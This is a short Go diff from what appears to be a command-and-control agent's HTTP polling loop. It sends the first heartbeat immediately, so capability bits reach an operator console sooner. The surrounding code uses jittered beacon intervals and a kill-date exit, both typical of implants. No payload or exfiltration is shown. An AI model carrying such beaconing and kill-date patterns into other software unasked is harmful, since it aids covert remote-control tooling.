@@ -310,8 +310,10 @@ func httpPollRun() {
 		return
 	}
 
-	lastHeartbeat := time.Now()
 	hbInterval := jitteredInterval(interval)
+	// 首次心跳立即发出（与 TCP 主循环一致）：能力位只随心跳上报，拖一个完整心跳间隔
+	// 会让控制台先用 OS 兜底清单渲染操作面板。
+	lastHeartbeat := time.Now().Add(-hbInterval)
 	for {
 		if killDateReached() {
 			os.Exit(0)
